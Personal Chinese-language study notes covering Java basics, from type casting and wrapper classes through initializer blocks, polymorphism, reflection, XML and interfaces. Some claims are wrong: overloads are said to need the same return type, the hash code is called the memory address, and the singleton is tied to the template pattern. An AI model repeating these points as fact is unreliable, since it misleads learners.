一般来说，向下转换是很少使用的，使用的时候一般用于：父类对象要使用子类的方法的时候，这个强制转换的作用就是将已经被向上造型的类变量还原成他原来的类型。也就是说，以前由向上造型从manager变为employee，那么转换之后就不再能通过转换后的employee变量来调用manager独有的方法了（就是manager自己增加的方法），这个动态绑定导致只能通过父类变量调用父子都拥有的方法，而不能调用子类独有增加的方法。如果，转换后的这个父类变量想要使用子类自己独有的方法（注意，这个时候，这个父类变量是通过向上造型获得的，他实际上引用的是子类变量，只不过他不能使用子类独有的方法而已，只能使用父子类都有的方法），这个时候就可以通过这个向下造型将向上造型获得的父类变量转换为子类变量。然后通过这个子类变量来使用它独有的那些方法。
Java中需要将向下造型与类型判断(isinstanceof)一起结合。


Java中类型转换有这么几种：
自动类型转换：
基本数据类型之间的短空间向长空间的数据类型转换。
类之间的子类向父类的向上造型。
自动转换能否完成的决定因素是：被转换的数是否在转换目标的范围之内？
>
	double i =5；//5这个int在double的范围之内，所以可以自动转换。
	Byte b=5；//5这个int在byte的范围之内，所以可以自动转换。不同强制转换。

强制类型转换：
基本数据类型之间的长空间向短空间的数据类型转换。
类之间的父类想子类的向下造型（当然是用于恢复被向上转换的子类型）。

实际上出来基本数据和类之间的类型转换，还有一种就是表达式类型的自动提升。
所谓的表达式的类型：就是表达式中最高级的运算元素的类型。如int+double：结果就是double型。
>
	int a=5+5.5;//这样就是错误的，因为右边的表达式结果是double型，要转换成左边的int型就需要强制转换，而不能直接转换，精度会有损失所以是不能自动转换的。
如果需要使用，就需要将右边表达式结果进行强制转换：
>
	int a=(int)(5+5.5);

这样才是可以的，这样就是表达式类型的提升。

此处一个注意点：任何的表达式结果的类型都是其所有的运算因子最高的类型。即使运算结果是其他的类型，也必须是运算式中的最高级。
例如：int a=10/4;//这是正确的，因为10/4这个右边的表达式的结果是2，因为10与4都是int型，所以，10/4的结果也必须是int型，即使算术上结果是2.5，那也只能得到2这个int型。所以这个式子是没有问题的。
所以来说：一个表达式的结果的数据类型早已被它的运算元素决定了，而不在于实际的算术运算的结果。


Null不能赋值给基本类型变量，只能赋给引用变量。

强类型语言更加健壮。

Java中的抽象类
-----------------
C++中多态是通过抽象类实现的。而Java不是。
实际上Java中也有抽象成员函数。但是Java中的抽象类与抽象成员函数时用于继承的。也就是，抽象函数不用实现。留给子类进行实现。
 抽象方法充当占位的作用。
抽象类不能实例化。也就是不能创建一个抽象类对象。
但是可以创建一个抽象类变量，只是这个变量不能引用抽象类对象，可以引用非抽象类对象（如子类对象）。这也就是说抽象类变量可以作为一个多态接口。通过抽象类变量来调用具体的子类变量的方法。因为可以创建抽象类变量，只是不能创建抽象类对象而已。

只要有一个抽象方法的类就必须声明为抽象类。
没有一个抽象方法的类也可以声明为抽象类。

C++与Java中关键词对比：
Java中final=const；但是添加了不能继承的特性。
Java中static=static；全类共有的方法与变量。
Java中abstract=abstract；但是去掉了控制多态性的特性。

Java控制可见性：
Private：仅对本类可见。
Public：对所有类可见。
Protected：对本包和所有子类可见（这一点和C++不同）
默认：也就是不人工设置可见性，这个默认对本包可见。


Java中所有的类都是Object类的子类。所以，可以使用Object 类来引用所有的类对象（包括任何的数组）。这是向上造型。


Java中抽象类的作用，抽象关键词见Java中abstract关键字。
主要是一个设计模式相联系：模板模式。Java中共有23中设计模式。
当在一个类中某个方法暂时不能被实现时，可以留给子类进行实现。这时候，就需要在父类中将这个方法设为抽象方法，同时这个类也是抽象类。
这个时候，在子类中，要么将父类中全部抽象方法都给实现了，要么子类继续当一个抽象类（因为只要子类中有一个抽象方法，子类就必须是抽象类）。

抽象类不能创建对象，但是抽象类引用变量可以引用非抽象类对象实例。
>
	Abstract class A；
	Class B extends A；//B中重写了A中的抽象方法。
	A a=new B（）；//A是抽象类，不能创建实例。B不是抽象类。A的引用变量可以引用B类对象实例。

然后就可以使用a这个引用来调用B中重写的A的抽象方法，这就模板模式的工作原理。

Java的Object类中的常用方法
----------------------
Equal方法：
判断对象相等的方法，比较对象是否相等。
对于对象而言，使用“==”判等，只是判断对象的引用变量是否相等，而不是判断对象本身是否相等。
所以要重写equal方法来对对象判等。

注：使用==判断基本数据类型的时候，只会判断数据实际的大小，而不会比较数据的类型。
Eg：
int a=10；
double =10.0;
a==b;//对的。
　
HashCode方法：用于返回对象的散列码。
散列码是由一个对象导出的一个整数值，没有规律。对象不同，他们所对应的散列码（hashcode）也是不同的。这个散列码就是对象的内存地址。相等对象返回相同的散列码。
计算散列码的算法方法在Object类中，每一个子类计算对象散列码的算法都来自于此。

toString方法：用于返回对象的描述性字符串。
Object类中有toString方法，我们可以自己定义自己的toObject方法。
注意，equal、toString，hashCode这些方法都是从Object继承下来的类才有的。对于基本数据类型如、int这些是没有的。因为他们不是对象。只有对象才能使用这些方法。
toString方法是非常有用的调试方法。类库中许多类都拥有自己的toString方法。
Tostring方法有一个标准写法。程序员自己重写的用于调试。

Clone方法，用于复制一个新的对象，重新分配空间。创建对象的副本。

getClass，返回类的情况。
Getname，返回类的名称。
Getsuperclass，返回超类的情况。

Java中的包装类
-------------
由于java是面向对象语言，所以java中的一切都是对象。所有的类都是object类的子类。
但是历史遗留下来的8个基本数据类型是例外（他们是从C来的）。不能当成对象来使用。
因此java为这8个基本类型提供包装器，将他们包装成类。本质依旧是基本数据类型，只是被包装成类。 	

Java中存在一个对象包装器，当需要将一个基本数据类型转换为一个对象的时候，就需要使用对象包装器来将基本数据类型装换为一个对象。实际上所有的基本数据类型都存在一个对应的类。
例如：
某个arraylist中只能存储Interger这种对象，而不能存放基本数据类型，这时候就需要将int型数据包装成interger对象。
Interger i=new interger（2）；//这样就将一个基本数据包装成i这个interger对象。这称为自动打包。现在不需要这样人工手动进行包装了，JDK会自动进行包装。
可以直接：Integer i=2；即可。
但是打包成对象之后，会导致操作效率下降。

当将一个对象赋给一个基本数据类型的时候，会自动进行解包。
int a=i；//这样就将一个对象进行解包了。
相当于：int a=i.intvalue();//现在可以自动转换，不需要再使用函数进行人工转换了。
另外，在对对象进行增、减操作的时候，也会自动进行解包，增减操作之后再进行打包。
i++；//先解包，然后对里面的基本数据进行增减操作，然后再打包。

基本数据“==”判等的时候，是判断数据大小的。
数据包装器“==”判等的时候，是判断类变量所指向的内存位置是否相等。
那么在数据包装之后的类对象进行判等就需要使用equal方法进行。
打包和拆包是编译器的事，不是虚拟机的事。编译器在生成打包后的类的时候，会生成一些字节码，加入必要的方法调用。虚拟机只是执行这些字节码。
使用基本数据包装器的好处是：可以将一些需要使用的基本方法放在对象中，因为基本数据类型中是不能自己添加方法的。所以包装成对象之后，就可以添加自己想要的方法。
 例如：将一个数值字符串转换成基本数据类型。这样就可以在包装后的类中添加必要的方法以实现这一点。
包装器对象时不可变的，也就是说基本数据类型被包装之后，就不能够被修改了。这个对象里面的内容就固定了。

Java基本类型的包装类。
byte->Byte;
short->Short;
……

在JDK1.5之后，基本类型的数据值可以直接当成对象，被类型引用变量引用。因为JDK1.5之后提供了自动装箱、解包功能，将基本数据类型数据包装成对象（被当成它的包装类使用）。也可见对象当成它的基本数据类型使用。
Eg：
Object a=3；//3这个基本数据类型值直接被a这个引用变量引用。
Integer a=2；//这也是对的，会自动将2这个基本数据包装成Integer类型。

还会自动将包装类的对象解包成基本数据。这是没有问题的。
int b=a；//这样自动将a这个对象解包成int这个基本数据类型。

由于包装和解包极其方便，所以现在很少直接使用int、double这种基本数据类型。而是使用包装的类。因为包装类使用更加方便。

对于所有的基本类型包装类，在1.7之后，添加了一个新的方法static compare（）；
Eg：
compare（Double a，Double b）：

Java中的方法栈及内存模型
-------------
任何一个方法里面声明的变量，都是存放在这个方法的栈里面，有很多的栈，每个方法都有自己的栈。方法运行结束就会释放这块内存。栈内存只是一个临时内存。
基本数据类型变量和变量值都是放在方法的栈中。
引用类型变量也是放在方法的栈中，这个变量引用的对象是放在堆中的。每个Java虚拟机只有一个堆内存，一般默认是64M，但是可以在运行java程序的时候进行设置。只要JVM不退出，堆内存就一直存在。Java -Xms256：就是设置为256M。堆内存中的对象只能通过引用来访问。
例如：数组类型变量存放在栈中，数组这个对象本身时存放在堆中的。
Java中并没有真正意义上的数组。所谓的二维数组，只是若干数组引用变量构成的一个新的数组。

二维数组的特殊之处：内含的一维数组的首地址也就是一维数组的引用变量被存放在堆内存中。然后这个引用变量指向堆中的另一块空间中的数组。而不是如一维数组中的那样放在栈中，所以：一个引用并不一定是放在栈中，还有可能放在堆中。

Eg：二维数组的使用：
int[][] a=new int[4][];
a[0]=new int[]{1,2};//一维数组的引用。依次确定各维数组地址。a[0]就是一个引用变量。指向一个数组。
…… 
总之，N维数组的元素就是n-1维数组的引用变量。如此递归，一直向下引用。


操作数组的Arrays类，这是一个工具类，用于操作数组。
都是一些static方法，Arrays.search(a,5);//在数组a中查找一个数据5

数组引用变量被从栈中销毁之后，数组对象本身时不一定会立刻从堆中销毁（不会随着数组引用变量而回收）。
而是依靠GC（垃圾回收线程），来自动销毁堆内存中的对象。它的原理就是：GC会自动记录堆内存中对象是否有引用变量引用它。会在合适的时候回收该堆内存的位置。 

内存泄露：内存被占用，但是没有被收回，导致内存泄露。
还有一种情况：内存还需要继续被使用，就直接收回了这个内存。
这两种是编程中常见的内存问题。C语言中尤为常见。Java中概率小很多。
Java中引用实际上就是指针。只不顾对指针进行了包装，使其使用更为安全。

char ch =”0”;
int num=ch;//这样num就是48；是一个int，可以自动转换的。如果在数组中第0个元素对应为为“0”；那么转换的时候就是num-48，这样才行。

Java中对象的内存管理步骤：
在堆中开辟一块permenant空间，用于储存类的static部分。
创建对象引用变量，放在栈中。
创建引用的对象本身，这个对象放在堆中，对象自有的（不是类所有的）成员变量也放在这个对象中，就是在堆中。
调用方法时，方法中的局部变量放在栈中。

Java中类的原型
-----------------
一个类中最多有5个部分：

    修饰符 class 类名
    {
    　　//0-n个field定义；
    　　//0-n个方法定义；
    　　//0-n个构造器定义；
    　　//初始化块（static块）……
    　　//内部类、内部接口、枚举等。……
    }
如果多于5个即为错误的类。


Field定义：注：[]表示可以省略；
[修饰符]+类型+field名+[=默认值];
修饰符：public|protected|private, static，final。
类型：基本数据类型，数组，类（JDK中的类或者自定义类），接口，枚举。

方法定义：
[修饰符]+返回值类型+方法名(0-n个参数)
{
……
}
修饰符：public|protected|private, static，abstract|final。Abstract与final相反。
返回值：基本数据类型，数组，类（JDK中的类或者自定义类），接口，枚举，void。


构造器定义：
[修饰符]+构造器名（0-n个参数）
{
……
}
修饰符：public|protected|private;
构造器的作用：初始化类的实例，也就是初始化对象。

初始化块：
1、[static]
{
　　//可执行语句。
　　//类初始化块。专门用于初始化类拥有的成员变量，也就是static成员变量。
}

Eg：
`Public class A
{
　　static int age；
　　
　　Static
　　{
　　Age=10；//类初始化块。
　　}
}`


2、如果没有static，就是实例初始化块。
{
　　//可执行语句。
　　//实例初始化块。专门用于初始化实例拥有的成员变量，也就是非static成员变量。
}
Eg：
Public class A
{
　　int age；
　　{
　　Age=10；//实例初始化块。
　　}
}
　　
注：初始化块是自动调用的。不能被认为调用。

为什么要定义初始化块？
对于一个类而言，会有许多个构造器，这些构造器中互相有一些重复的初始化语句，这样就会加大代码量。所以，可以将这些重复的初始化语句放在一起，构成一个初始化块，让这些重复的初始化语句对于每一个对象或者类都自动执行。就可以减小代码量。这就是初始化语句的作用。
但是：只有处于构造器中前面的初始化语句才可以放在初始化块中，而不是跳跃式放入初始化语句。

Java中允许多个实例初始化块，但没有意义！


什么是实例初始化块的工作原理？
在编译中，所有的实例初始化块都会被还原到相应的构造器中，然后直接调用构造器即可。因此在汇编代码中并没有初始化块的痕迹。
同时，要注意的是：在声明成员变量时赋给的成员变量的值也是不会在汇编代码中留下痕迹的。也就是说，声明成员变量是赋给成员变量的初始值也会在汇编的时候直接插入到相应的构造函数中。

总之，初始化块中对成员变量赋值与成员变量声明时所赋的值都是一种假象（不包括static初始化块和static成员变量）。他们都是在编译的时候被直接插入到构造函数中（放在构造器的最前面。初始化块与成员变量赋值在构造器中具体哪一个放在前面决定于代码中哪一个放在前面，放在前面的在构造器中放在前面。），然后通过调用构造函数来进行起作用的。


类初始化块的工作原理？
类初始化块在类被加载的时候执行。对类拥有的field进行初始化。不会对所有的对象都执行，总共只执行一次。

static成员变量声明时赋值会在编译的时候插入到static初始化块中，然后执行static初始化块即可。插入位置与在代码中相对位置有关。这一点是不同于实例初始化块（实例成员变量和实例初始化块都一起插入到构造函数中）

那么初始化块代码在什么时候执行？
实例初始化块在每次调用构造器之前自动执行。而且实例初始化块与实例成员变量会在编译时直接插入到构造器中最前面，然后直接执行构造器即可。
类初始化块在类加载的时候就执行。而且类成员变量会被直接插入到类初始化块中，直接执行类初始化块即可。


Static:实际上并不是静态的意思。也不是公共的意思。而是一个标志，表明这个成员变量是属于这个类的。而不是属于某个对象。
在创建类对象之前，就将整个类加载到内存中，加载过程中，就将属于这个类自己的东西加载到堆中的某一个区域（叫做：permanent区）。也就是说，还没有分配对象的空间（构造器启动之前），就已经为static成员分配堆中的空间了。
总之：static修饰的属性、方法根本就不属于对象的，就是说，任何一个对象根本就没有这个static属性、方法。即使允许通过对象来访问static属性、方法。但是这只是一个语言设计上的错误、缺陷。实际上这个static属性、方法根本就不属于任何对象。只属于类。考试的时候常有这样的题目作陷阱。
　　
static方法也是属于这个类的。而不是属于某一个对象。也就是说，永远不要用某一个对象来调用static方法，因为对象根本就不永远这个static方法。

注：只要用到了一个类，那么就会初始化static部分，
Eg：person p；//这样就是用到了person这个类，就是加载了person这个类，该类拥有的成员变量就会进行初始化。
而且初始化是从顶层向下层的顺序进行的。

Java中所有的引用如果是被JVM初始化，那么全部被初始化为null；没有指向任何的有效内存区。
类属性、方法（static修饰）与实例属性、方法（非static修饰）是不一样的。

注意：永远都不要使用对象来调用Static修饰的类方法、类属性。如果别人的程序中有使用对象来调用static修饰的类方法、类属性时，首先就要把这个对象换成类。然后再继续看。
这种题目经常出现在面试考题中，所以要注意这个问题。一定要使用类来调用类方法、属性。而不是对象。

局部变量，既不属于类也不属于对象，所以永远不能用static修饰。

注：java方法中怎样传入多个参数？不知道有多少个。

    void f（int... Nums)
    {
    　　Nums[1]……；
    　　Nums[2]……；
    }//int后面加...,表明传入多个int。在方法中nums相当于一个数组引用。
参数个数可变的方法只能参数中可变的参数只能有一个。也就是说nums只能有这一个数组，而不能又有第二个多参数组。本质就是数组，实际上不怎么使用，不如直接传入一个数组引用。
　　
　　
`    Person p = new person();//注意：此中new才是创建对象，构造函数是对对象拥有的成员变量``进行初始化。二者功能是不同的。`

Java中this关键字
------------
this关键字用法：
this引用：在任何地方都可以使用this引用来调用非static方法。非static方法属于对象。
this调用：只能在构造函数第一行进行调用，用于调用本对象其他的构造函数。
在本类的方法中使用本对象的成员变量时，最好将this留下来。包括在构造函数中亦是如此。

this调用：使用this（）调用另外一个构造器。This()相当于一个构造器。
this引用：使用this.name;这是调用一个成员变量。

Java中递归
------------------

递归方法：
递归方法里面，实际上包含了一个隐式的循环。
递归方法就是再次调用自己，朝向已知的方向调用。

Java中重载
--------
方法的重载：
两同一不同：返回值相同，方法名相同。参数不同。
方法重载与返回值类型、是否static没有关系。
Java中访问权限
Private:当前类访问权限。
Protected:子类访问权限。
Public：公共访问权限。
没有设置访问权限：包访问权限。希望在同一个包中可以访问。
局部变量不能用这些修饰符修饰的原因：局部变量应该只在这个方法中有效，本来作用域就很想。所以就不需要使用修饰符限制使用范围了。

注：整个类是属于包的。也就是说类自己的修饰符可以省略。只能有一个类使用public修饰。就是主类。
如果这个类前加了public，那么在包内（package）和包外都可以访问。
如果用private等修饰，就没有意义了。
类名修饰符：public\final\abstract之一。

总之：
成员方法与变量的权限修饰符为：
Public：所有地方都可访问。
Private：本类内部可以访问，外部都不能访问。
Protected：本类内部和子类中可以访问，其他都不能访问。
未写：本包内可以访问，包外都不能访问。
所以，成员方法与变量的权限修饰符是public|protected|private|未写。

类的权限修饰符为：
Public：所有地方都可以使用这个类。
不能是Private：因为这个类不在其他类里面，所有设置为private之后，这个类就不能被使用了，因为private只能被本类内部使用。
不能是protected：因为这个类不在其他类里面，因为protected只能被子类所用，这个protected类不在另一个类中，所以他不能被另一个类的子类所使用。
未写：这个类可以被同一个包中的任何东西访问。
所以，类的权限修饰符只能是public或者未写。
Java中的包
包：命名空间的作用。将不同公司定义的同名类互相隔开。
所以，java中一个类的类名是：包名+类名。
定义包的语法：
Package 包1.包2.包3.……；

包名：用公司的域名的倒写。

要将一个类放在某一个包中需要：
在类的源代码中使用package指点放置目录路径。
生成的class文件必须放在package所声明的文件结构下面。可以手动建立package所声明的目录路径，然后将编译结果放进去。
还可以在编译的时候使用 javac -d . 源文件。这样-d选项可以自动创建package指明的目录路径，并将结果放在这个路径里面。也就是放在包里。

注意：在运行放在一个包中的class时，不再是java hi.  而应该加上包名：java hu.pi.hi。这样才行。
也就是说，运行包中的编译结果时，也必须将路径加上。而且当前目录必须在hu目录之外，不能进入包的路径中去运行class。必须在包的目录外运行（加上class的路径）。

总之，一旦为一个类加上了包名。那么这个类的名字就变为包名+类名。那么在任何时候使用这个类编译的class的时候，都必须使用包名+类名。如java命令运行这个class或者在其他源文件中import这个class的时候，均是如此。

使用这个类的时候，通过import包名来导入类。
还可以使用：import static java.lang.*;这就是JDK1.5后提供的静态导入。用于导入一个类中所有的static成员。

#Java中的方法重写
--------------------
方法重写：重写后的方法：两同、一大、一小。
方法名、参数列表相同。
访问权限更大或者相等。
返回值类型更小或者相同。子类抛出的异常要更小。

在重写方法前面加上：@override，可以在编译的时候，让编译器强制检查重写的方法有无错误。没有别的用处。
super：用于调用父类的方法或者某一个构造器。
注意：方法会有重写，但是成员变量没有重写（即使子类有父类中同名的成员变量，也依旧不是进行覆盖，而是子类中有了两个同名的该成员变量），也就是说不能在子类中覆盖父类中国的某个成员变量，而是必须在构造器中进行初始化。
在子类中无法区分到底是使用子类还是父类中的同名成员变量、方法。默认的是访问子类中的，也就是说默认是加上了this。那么如果要使用父类的成员变量、方法，可以使用super关键字。
在使用this或者super作构造器调用的时候，都必须放在构造器的第一行。而且this与super调用构造器是不能同时出现的。
如果没有人为调用父类的super或者this构造器构造器，机器会自动调用父类的无参构造器。
否则会人工调用对应的构造器。


关于重写：
父类中的public方法可以被子类重写。
父类中的private方法不能被子类重写。因为根本就无法访问，更不必说重写了。
父类中protected方法能被子类重写。
父类中为表明访问权限的方法不能被处于不同包中的子类重写。
Eg：

     class newer
	{
	int a=10;
	private void f()
	{
		System.out.println(10);
	}

	}

    class newTest extends newer
    {
	private void f()
	{
		System.out.println(100);
	}  //这是newTest自己新建的方法，而不是重写了newer类中已有的方法。即使他们是同名的方法。
	public static void main(String[] args)
	{
		newTest n = new newTest();
		n.f();
	}
	}




#Java中的多态
-------------
多态：可以使父类引用变量引用一个子类对象。使用的时候，依旧是使用父类引用变量来调用子类的方法。
所谓的态：行为、特征。
所谓的多态，就是同一个引用变量（如父类引用变量），在调用执行同一个方法的时候，表现出各种不同的行为特征。

多态实现的原因：
java中引用变量的类型有两种：
编译时类型：这就是写源代码时声明的引用变量类型。
运行时类型：决定于实际运行时这个引用变量所引用的对象。
如果，某引用变量的编译时类型与运行时类型不一致，就可能导致多态。
所以这样一来，两个编译是类型一样的引用变量，由于实际运行时类型不同，导致他们在调用相同的方法时，呈现不同的行为特征，这就是多态。
在编译的时候，编译器将父类引用变量视为父类变量。
在运行的时候，JVM将父类引用变量视为子类变量。

但是必须注意的是：多态针对的只是继承中那些在子类中已经重写的方法，而对于不是重写的方法，并不能体现多态的特性。也就是说，不能用父类引用变量来调用子类中新加入的方法。如果使用父类引用变量来调用子类中新加入的方法，就连编译都没办法通过。
因为：
在编译的时候，编译器将父类引用变量视为父类变量。
在运行的时候，JVM将父类引用变量视为子类变量。

#Java中引用类型的强制类型转换
-----------------
向下造型：也就是强制类型转换：
那么怎样让父类引用变量能够调用子类新加入的方法呢？
当一个父类引用变量引用了一个子类对象的时候，这就是所谓的向上造型。是自动进行的。

那么怎样让这样的一个父类引用变量调用子类新加入的方法？
就要采用向下造型。强制将父类引用变量转换为子类引用变量，这样就可以通过新的子类引用变量来调用子类新加入的方法了。
使用向下造型的前提是父类引用变量是通过子类对象向上造型而得来的。

强制转换的原理：
是使得原来的父类引用变量的编译时类型发生改变，变成了子类的引用类型。
而父类引用变量的运行时类型无需发生改变，因为原来的运行时类型就是子类类型。


强制类型转换的注意点：
基本数据类型中，除了boolean类型，其他类型都可以使用强制类型转换来实现大空间向小空间的转换。
引用类型中，只能在具有继承关系的两个类型间进行转换（父类引用变量转换为子类引用变量）。否则在编译的时候即会报错。而且将父类引用变量转换为子类引用变量之前，必须保证这个父类引用变量确实是引用一个子类对象才可以进行下面的转换。

`instanceof()`:用于判断前面的前面的引用变量是否引用后面类型的实例。
注意：使用这个函数时：要么前面的引用变量引用了后面类型的变量，要么二者有继承关系。否则编译时会报错。
Eg：
1

	Class A extends B；
	B b；
	b instanceof A；//false，二者具有继承关系。


Class A extends B；
B b；
b instanceof B；//true，b引用变量引用了后面的类型的实例。

	
Class A extends B；
B b；
b instanceof M；//会编译报错。因为b引用对象既不是M类实例，也与M类没有继承关系。

Java中常见异常
NullPointerException：空指针引用异常。
ArrayIndexOutOfBoundary：数组越界异常。
ClassCastException：类型转换异常：非引用子类对象的父类引用变量转换为子类引用变量发生异常。

#Java中编译类型
------------------
一个误区：
在继承中，如果子类新加入了一个与父类同名的成员变量，不会覆盖父类的成员变量，而是子类拥有了两个同名的成员变量。那么在通过子类或者父类引用变量来调用该名字的成员变量的时候，具体是调用了哪一个成员变量，决定于这个引用变量的编译是类型（到底是子类引用变量还是父类引用变量）。
示例如下：
>
	Class A
	{
 		int a=10；
	}
>
	Class B extends A
	{
 		int a=20；
	}//这样B类中有两个a成员变量，一个是10，一个是20.
>
那么，使用时，
>
	B b=new B();
	b.a;//这里输出的是20这一个成员变量，因为这里引用变量的编译时类型是B。
	A b=new B();//发生向上造型
    b.a;//这里输出的是10这一个成员变量，因为这里引用变量的编译是类型是A。
#Java中的Class类
--------
程序运行的时候，每一个类(如Person类)在加载的时候，JVM都会为这个类创建一个Class对象，这个Class对象里面记载的都是这个程序里面所有Person类对象的信息。同时我们可以通过Person类的Class对象获得这个Person类的所有情况，如：Person类里面的所有方法对象，Person类里面的所有Filed，Person类里面的所有构造方法对象。

#Java中的反射
----
反射：能够分析类能力的程序称为反射。对程序员没什么用处，只对工具设计者有用。

用于**动态获取类中的成员**：  
1. 可以获取一个类的`Class`  
2. 可以获取这个类的所有方法对象(注意：Java中一切都是对象，包括方法，一个类中的成员，即使连方法也是对象。) 可以通过这个方法对象来使这个方法被执行，将一个类对象作为方法对象的参数传入即可。  
3. 也可以获取这个类的所有Field对象。

反射的作用在于：  
当我们在使用一个已有的类的时候，在主代码的main()方法中使用别的已有的类的时候，如果被使用的类发生了改变，那么导致我们的main()方法中也要修改大量的代码，以适应被使用的类的修改。这个时候，如果在main()方法使用了反射(reflect)，那么就可以通过被使用的类的名字来获取这个被使用的类的所有情况(方法、Field等)，这样就不必修改我们的主程序了。只需在被使用类的配置文件中写上被使用类的名字，在mian()方法中通过读取这个配置文件获得这个被使用类的名字即可通过反射的方法使用这个类。即使修改了要使用的类的名字或者实现，所有的修改也只体现在这个类的配置文件中，将需要修改的地方减至最少，提升了类的可扩展性。

反射作用使用示例：

被使用类与使用类：
>
	import java.io.*;
	interface eatable
	{
		public void eat();
	}
>	
	class person implements eatable
	{	
		public void eat()
		{
			System.out.println("person EAT");
		}
	}
>	
	class animal implements eatable
	{	
		public void eat()
		{
			System.out.println("animal EAT");
		}
	}
>	
	public class ClassTest
	{
		public static void main(String[] args)throws Exception
		{
			BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File("file.txt")) ));
			Class className = Class.forName(br.readLine());
>			
			//使用了anima类
			eatable ea= (eatable)className.newInstance(); 
			ea.eat();
		}
	}
>
被使用类的配置文件：`file.txt`
>
	animal
各种框架里面大量使用了反射，但是只对用户暴露了类名与该类的配置文件，防止被修改。


#Java中的注解
----------------
例如：在重写一个方法的时候，在方法上面加上`@Override`，在编译阶段就保证编译成功。这就是注解(`Anotation`)的作用，这是和注释不一样的。  
`Anotation`是一个接口，`Override`之类的都是它的实现类。
获取注解对象只有一种方法：反射。

#Java中的XML
--------------
数据存储的几种方式：  
1. 键值对形式，name：“li”  
2. `XML`描述  
3. 数据库，可以存储数据和操作数据
数据量比较大的时候，使用数据库。
扩展性(`Extended`)标识语言，用于标识描述数据信息。其是`SGML`标识语言的简化。
  
再，由于`HTML`语言的语法不够严谨，所以在`HTML`4.0.1版本之后，将其过渡至`XHTML`(扩展性`Extended`）语言,`XHTML`更加严谨、规范。`XHTML`可以理解为是`HTML`向`XML`语言过渡的中间产物。  

`HTML`与`XML`之间的区别在于：  
1. `HTML`是固定标识，只能写它能识别的标识。`XML`中的标签可以自由定义。  
2. `HTML`较为随意，`XML`很严谨。  
3. `HTML`将数据和其显示结合在一起，不方便对数据进行操作。`XML`将数据与其显示分开，纯粹对数据进行描述。数据描述是数据描述，显示是显示。

`XML`的好处：  
1. 结构严谨，规范。  
2. 是标准的数据交换文件，已用于通用的配置信息文件。  
3. 结构简单，便于书写，增强阅读性。  
4. 将数据进行结构化，是数据之间具有明确的层次关系。

`XML`文档示例：  
>
	<?xml version="1.0"?>
	<students>
		<student>
			<name>zhangsan</name>
			<age>20</age>
		</student>
>		
		<student>
			<name>lisi</name>
			<age>22</age>
		</student>
>		
		<student>
			<name>wangwu</name>
			<age>21</age>
		</student>
>		
		<student>
			<name>zhaoliu</name>
			<age>23</age>
		</student>
	</students>
 
`XML`文档中**只能有一个顶层元素**。如上面的`<students>`这个元素，也叫根元素。也就是最外层的标签，只能有一个。

`CDATA`区：当我们的文档中，某一段数据不想被解析，只希望作为单纯的字符而已。那么，可以将这段字符放在CDATA区，放在<![CDATA[ *数据* ]]>标签里面。这样，里面的数据就能够不解析，而是作为单纯的字符。

XML中所有标记的属性值必须用""或者''括起来。

XML中名字可以使用字母、数字、中文（需要在XML声明的时候知道encoding属性)



#Java中的单例类
-----------------
与单例类相联系的是一个设计模式：模板模式。  
某些时候，我们只想为某个类创建一个对象。这时候就需要使用单例类。  
要实现单例：  
不能暴露构造器。否则可以自由创建多个实例。所以，需要人工写一个无参构造器，且设为`private`形式，这样可以防止`JDK`自己创建默认构造器。且构造器只能在类内使用。  
设置一个静态`field`用于缓存在3中的方法所创建的实例，且这个`field`可用于检测保证仅创建了一个实例。  
暴露一个方法，用该方法来返回一个实例。设为`public`。由于调用这个方法的时候没有实例，所以需要使用类来调用该方法。所以这个方法必须是`static`的。同时，该方法内部必须在创建一个实例之前先检测*2*中的`field`，保证只存在一个实例，这样才能保证这是一个单例类。  
使用*3*中创建的方法来创建一个对象。

示例如下：
>
	public class singleTon
	{
		public int a;
		private singleTon() //创建private构造器，防止JDK自己创建构造器
		{
		}
>
		private static singleTon h; //创建static field，用于缓存创建的单例对象，同时检测是否单例。
>	
		public static singleTon f() //创建static方法，以创建单例对象，返回该对象引用。
		{
			if(h==null)
			{
				h=new singleTon();
			}
			return h;
	    }
		public static void main(String[] args)
		{
			System.out.println(singleTon.f().a); //使用static单例对象创建方法来创建单例。
		}
>		
		{
			a=10;
		}
	}



#Java中的接口
----------------
接口的功能非常丰富，因为接口往往是和设计模式结合使用的。
接口的概念：
可以认为接口是一种彻底的抽象。
是从多个相似的类中抽取出来的一种规范。可以认为接口是一种规范。
接口体现的是通信的规范。例如电脑主板上的插槽，就是因为这些插槽都遵循统一的通信规范，所以也称之为接口。


接口的定义：

	[修饰符] interface 接口名
	{
	　　0-n个field；
	　　0-n个抽象方法；
	　　0-n个内部类、内部接口、内部枚举定义；
	}
接口实现的只是一个规范，表示某一种功能（仅是表示一个功能而已），而不代表一个实体，是一个比抽象类更抽象的东西，只表示一个功能，任何implement这个接口的类都具有了这个功能。

接口不能有构造器，也不能有初始化块。
interface修饰符：public|未写。因为类的修饰符就是public或者未写。见：Java中访问权限。Final修饰符也不行，因为interface中存在抽象方法。也没有abstract修饰符。Interface比abstract更加抽象。
接口名有形容词。接口代表它可以做某一件事情（具有某一项功能）。
接口里面field的修饰符：public static final三个。默认的就已加上了这三个修饰符。自己不能进行修改了，要么不写，要么写这三者中的一部分。即使自己写了别的也就只是在这三者基础上加。 所以，field必须在定义的时候就赋与初值。因为有final、static修饰，所以必须由程序员来赋初值，但是没有初始化块，而且static变量不能在构造器中初始化。
接口里的方法修饰符：默认修饰符：public abstract，不能用static进行修饰，因为abstract不能与static同时修饰。也不能有final修饰符。同样不能进行修改。限定死了。所以方法必须没有方法体。也就是是说接口是个更抽象的东西，里面的方法必须没有方法体。都是抽象方法。
接口里的内部类、内部接口、内部枚举，默认修饰符：public static。不能修改。


注：为什么借口的field、方法、内部类等这些都是采用public进行修饰？
Answer：因为借口的作用就是让别人使用这个功能，所以必须对外开放，所以都有默认public。
总之，接口内部和接口本身的修饰都可以不写，而使用自己默认的。写不写效果一样。

一个类只能有1个父类。但是一个接口可以有n个父接口。

对于一个java文件而言，里面只能有一个public类，运行的时候，会自动装载这个public类，然后装载这个public类中的static成员（包括static成员方法与变量），装载static void main方法的时候，就会自动从这个main方法开始执行。所以，java成员能够运行的道理，从要运行文件中的唯一一个public类开始，从这个public类的static main方法开始执行。

同样，对于，一个java文件而言，只能有一个public interface。其余都是默认的为空。可以将接口理解为一种特殊的类。是一种彻底抽象的类。

接口的使用
